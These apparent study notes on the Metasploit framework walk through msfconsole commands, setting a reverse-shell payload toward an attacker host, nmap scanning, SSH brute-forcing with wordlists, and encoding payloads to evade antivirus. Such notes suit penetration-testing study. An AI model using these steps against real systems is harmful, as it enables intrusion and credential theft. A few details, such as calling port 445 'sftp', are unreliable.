# Metasploit framework
It is used for exploitation most of the time. Sometimes for scanning.  

To start the framework use
- msfconsole 

To exit the framework use
- exit  

After starting the interactive msfconsole you can still use all your external shell commands like:
- pwd
- ls
- nmap
- ifconfig  

When trying to select an exploit it is good idea to use an external nmap script prepared to find out all potential vulnerabilities which you can use.


## Terminology
- Exploit - take advantage of a vulnerable software to start reverse shell or rootkit.

- ZeroDay - a vulnerability that wasn't fixed yet

  - ZeroDay 2017 - dangerous exploit for Windows 7/8, if someone was connected to the same network with a W7/8 with open 445/sftp port he could get hacked.

- Payload - reverse shell, actively exploiting software which you have to deliver. We can deliver it to a victim to get access to it.

# Starting metasploit framework
You can start postgresql service to make your metasploit framework run faster, but it is not necessary.

- service postgresql start (optional)
- msfconsole (start interactive console shell)

# Using msfconsole
To receive manual use
- help  

## Finding specific exploits
- search [name]
- search windows (looks up all windows based exploits)  

## Using exploits
- use [exploit name]
- use exploit/multi/browser/java_rhino (opens up a new interactive shell)

## Find out more about the exploit
- show options (shows all available options for this exploit and required parameters)
- show targets (shows the target machines it can be run on)
- show info (describes what exactly is this exploit)
- show payloads (shows available payloads for this exploit)

## Set exploit parameters
- set PAYLOAD [payload]
- set PAYLOAD java/meterpreter/reverse_tcp
- show options
- set LHOST [attacker-ip-addr]
- show options

# Metasploit modules

## Exploits
They are used to target a vulnerable software running on victim machine. There are different exploits for different platforms and different operating systems.

## Payloads
Files that we send to victim (for example backdoors). 
- singles (quite small, just one action)
- stagers (bit bigger, mostly used to acquire shell)

## Auxiliary
Fuzzers, spoofers, sniffers. Usually we will use auxilary modules for scanning, and sometimes for brute forcing ssh

## Encoders
They are used to bypass antivirus, we can change how the code looks so that antivirus doesn't find it. Antivirus use large databases that have samples of common malware. If we change how the code looks by using encoder antivirus will not know that it is a malware. Coding your own malware is a great advantage, because it can be used to trick antivirus.

## Post
Tools & programs used after you exploit the target. After acquiring access to target machine you can do further exploits (gather cookies etc)

## Nops
No-operation, which is a command in assembly language that does no operation. Nops keep payload code consistent. This instruction is '0x90'.

# Target Pentesting
## Start metasploit framework
- msfconsole

## Look around
- nmap -sV [network]

## Choose a service & look for exploits
- search [service/platform/protocol]
- search ssh

## Choose an exploit
- use [exploit path]
- use auxilary/scanner/ssh/ssh_version (enters the exploit terminal)

## Set up & run exploit
- show options
- set THREADS [n]
- set RHOSTS [target-ip-addr]
- show options
- run (start the exploit)

## Choose a passwordlist
If you decide to do brute-force attack you may wish to decide on a different password list. 
- /usr/share/wordlists/metasploit

Choose the one you wish.  
Set the path to the dictionary in the metasploit console
- set USERPASS_FILE [path]  

When trying to brute force ssh it is probably stupid idea to try root user, because it will probably be blocked by default by the SSH service.

